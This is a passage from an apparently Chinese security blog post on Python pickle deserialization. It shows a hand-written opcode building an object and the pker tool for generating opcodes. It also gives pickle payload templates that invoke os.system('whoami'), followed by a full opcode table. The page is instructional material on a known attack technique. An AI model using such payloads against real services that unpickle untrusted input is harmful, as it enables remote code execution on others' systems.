+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>opcode<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;&#39;&#39;c__main__
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>User
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>(S&#39;ChuanSao&#39;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>S&#34;258&#34;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>tR.&#39;&#39;&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>user <span style=color:#f92672>=</span> pickle<span style=color:#f92672>.</span>loads(opcode<span style=color:#f92672>.</span>encode())
+</span></span><span style=display:flex><span>print(user<span style=color:#f92672>.</span>name, user<span style=color:#f92672>.</span>age)  <span style=color:#75715e># ChuanSao 258</span>
+</span></span></code></pre></div><h2 id=pker>pker<a hidden class=anchor aria-hidden=true href=#pker>#</a></h2><p>Tools for converting Python source code to Pickle opcode automatically</p><p>工具地址：https://github.com/eddieivan01/pker</p><p>pker主要用到GLOBAL、INST、OBJ三种特殊的函数以及一些必要的转换方式：</p><pre tabindex=0><code>GLOBAL 对应 opcode:c
+GLOBAL(&#39;os&#39;, &#39;system&#39;) 对应 opcode:cos\nsystem\n
+
+INST 对应 opcode:i
+INST(&#39;os&#39;, &#39;system&#39;, &#39;whoami&#39;) 对应 opcode:(S&#39;whoami&#39;\nios\nsystem\n
+
+OBJ 对应 opcode:o
+OBJ(GLOBAL(&#39;os&#39;, &#39;system&#39;), &#39;whoami&#39;) 对应 opcode:(cos\nsystem\nS&#39;whoami&#39;\no
+
+xxx.attr=&#39;sxc&#39; 对应opcode:(S&#39;attr&#39;\nS&#39;sxc&#39;\ndb
+
+return 对应 opcode:.
+</code></pre><h3 id=基本用法>基本用法<a hidden class=anchor aria-hidden=true href=#基本用法>#</a></h3><p>pker：</p><pre tabindex=0><code>INST(&#39;os&#39;, &#39;system&#39;, &#39;whoami&#39;)
+return
+</code></pre><p>利用pker.py转换为opcode：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>python pker.py &lt; pker
+</span></span><span style=display:flex><span>b<span style=color:#e6db74>&#34;(S&#39;whoami&#39;\nios\nsystem\n.&#34;</span>
+</span></span></code></pre></div><h2 id=opcode表>opcode表：<a hidden class=anchor aria-hidden=true href=#opcode表>#</a></h2><pre tabindex=0><code>MARK           = b&#39;(&#39;   # push special markobject on stack
+STOP           = b&#39;.&#39;   # every pickle ends with STOP
+POP            = b&#39;0&#39;   # discard topmost stack item
+POP_MARK       = b&#39;1&#39;   # discard stack top through topmost markobject
+DUP            = b&#39;2&#39;   # duplicate top stack item
+FLOAT          = b&#39;F&#39;   # push float object; decimal string argument
+INT            = b&#39;I&#39;   # push integer or bool; decimal string argument
+BININT         = b&#39;J&#39;   # push four-byte signed int
+BININT1        = b&#39;K&#39;   # push 1-byte unsigned int
+LONG           = b&#39;L&#39;   # push long; decimal string argument
+BININT2        = b&#39;M&#39;   # push 2-byte unsigned int
+NONE           = b&#39;N&#39;   # push None
+PERSID         = b&#39;P&#39;   # push persistent object; id is taken from string arg
+BINPERSID      = b&#39;Q&#39;   #  &#34;       &#34;         &#34;  ;  &#34;  &#34;   &#34;     &#34;  stack
+REDUCE         = b&#39;R&#39;   # apply callable to argtuple, both on stack
+STRING         = b&#39;S&#39;   # push string; NL-terminated string argument
+BINSTRING      = b&#39;T&#39;   # push string; counted binary string argument
+SHORT_BINSTRING= b&#39;U&#39;   #  &#34;     &#34;   ;    &#34;      &#34;       &#34;      &#34; &lt; 256 bytes
+UNICODE        = b&#39;V&#39;   # push Unicode string; raw-unicode-escaped&#39;d argument
+BINUNICODE     = b&#39;X&#39;   #   &#34;     &#34;       &#34;  ; counted UTF-8 string argument
+APPEND         = b&#39;a&#39;   # append stack top to list below it
+BUILD          = b&#39;b&#39;   # call __setstate__ or __dict__.update()
+GLOBAL         = b&#39;c&#39;   # push self.find_class(modname, name); 2 string args
+DICT           = b&#39;d&#39;   # build a dict from stack items
+EMPTY_DICT     = b&#39;}&#39;   # push empty dict
+APPENDS        = b&#39;e&#39;   # extend list on stack by topmost stack slice
+GET            = b&#39;g&#39;   # push item from memo on stack; index is string arg
+BINGET         = b&#39;h&#39;   #   &#34;    &#34;    &#34;    &#34;   &#34;   &#34;  ;   &#34;    &#34; 1-byte arg
+INST           = b&#39;i&#39;   # build &amp; push class instance
+LONG_BINGET    = b&#39;j&#39;   # push item from memo on stack; index is 4-byte arg
+LIST           = b&#39;l&#39;   # build list from topmost stack items
+EMPTY_LIST     = b&#39;]&#39;   # push empty list
+OBJ            = b&#39;o&#39;   # build &amp; push class instance
+PUT            = b&#39;p&#39;   # store stack top in memo; index is string arg
+BINPUT         = b&#39;q&#39;   #   &#34;     &#34;    &#34;   &#34;   &#34; ;   &#34;    &#34; 1-byte arg
+LONG_BINPUT    = b&#39;r&#39;   #   &#34;     &#34;    &#34;   &#34;   &#34; ;   &#34;    &#34; 4-byte arg
+SETITEM        = b&#39;s&#39;   # add key+value pair to dict
+TUPLE          = b&#39;t&#39;   # build tuple from topmost stack items
+EMPTY_TUPLE    = b&#39;)&#39;   # push empty tuple
+SETITEMS       = b&#39;u&#39;   # modify dict by adding topmost key+value pairs
+BINFLOAT       = b&#39;G&#39;   # push float; arg is 8-byte float encoding
+
+TRUE           = b&#39;I01\n&#39;  # not an opcode; see INT docs in pickletools.py
+FALSE          = b&#39;I00\n&#39;  # not an opcode; see INT docs in pickletools.py
+
+# Protocol 2
+
+PROTO          = b&#39;\x80&#39;  # identify pickle protocol
+NEWOBJ         = b&#39;\x81&#39;  # build object by applying cls.__new__ to argtuple
+EXT1           = b&#39;\x82&#39;  # push object from extension registry; 1-byte index
+EXT2           = b&#39;\x83&#39;  # ditto, but 2-byte index
+EXT4           = b&#39;\x84&#39;  # ditto, but 4-byte index
+TUPLE1         = b&#39;\x85&#39;  # build 1-tuple from stack top
+TUPLE2         = b&#39;\x86&#39;  # build 2-tuple from two topmost stack items
+TUPLE3         = b&#39;\x87&#39;  # build 3-tuple from three topmost stack items
+NEWTRUE        = b&#39;\x88&#39;  # push True
+NEWFALSE       = b&#39;\x89&#39;  # push False
+LONG1          = b&#39;\x8a&#39;  # push long from &lt; 256 bytes
+LONG4          = b&#39;\x8b&#39;  # push really big long
+
+_tuplesize2code = [EMPTY_TUPLE, TUPLE1, TUPLE2, TUPLE3]
+
+# Protocol 3 (Python 3.x)
+
+BINBYTES       = b&#39;B&#39;   # push bytes; counted binary string argument
+SHORT_BINBYTES = b&#39;C&#39;   #  &#34;     &#34;   ;    &#34;      &#34;       &#34;      &#34; &lt; 256 bytes
+
+# Protocol 4
+
+SHORT_BINUNICODE = b&#39;\x8c&#39;  # push short string; UTF-8 length &lt; 256 bytes
+BINUNICODE8      = b&#39;\x8d&#39;  # push very long string
+BINBYTES8        = b&#39;\x8e&#39;  # push very long bytes string
+EMPTY_SET        = b&#39;\x8f&#39;  # push empty set on the stack
+ADDITEMS         = b&#39;\x90&#39;  # modify set by adding topmost stack items
+FROZENSET        = b&#39;\x91&#39;  # build frozenset from topmost stack items
+NEWOBJ_EX        = b&#39;\x92&#39;  # like NEWOBJ but work with keyword only arguments
+STACK_GLOBAL     = b&#39;\x93&#39;  # same as GLOBAL but using names on the stacks
+MEMOIZE          = b&#39;\x94&#39;  # store top of the stack in memo
+FRAME            = b&#39;\x95&#39;  # indicate the beginning of a new frame
+
+# Protocol 5
+
+BYTEARRAY8       = b&#39;\x96&#39;  # push bytearray
+NEXT_BUFFER      = b&#39;\x97&#39;  # push next out-of-band buffer
+READONLY_BUFFER  = b&#39;\x98&#39;  # make top of stack readonly
+</code></pre><p>参考资料：</p><p><a href=https://xz.aliyun.com/news/13498>https://xz.aliyun.com/news/13498</a></p><p><a href=https://xz.aliyun.com/news/7032>https://xz.aliyun.com/news/7032</a></p><p><a href=https://zixyd.github.io/2024/02/06/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/>https://zixyd.github.io/2024/02/06/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a></p></div><footer class=post-footer><ul class=post-tags></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://blog.w8nn9z.top/>w8nn9z Blog</a></span> ·
+<span>Powered by
+<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
+<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
+</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>
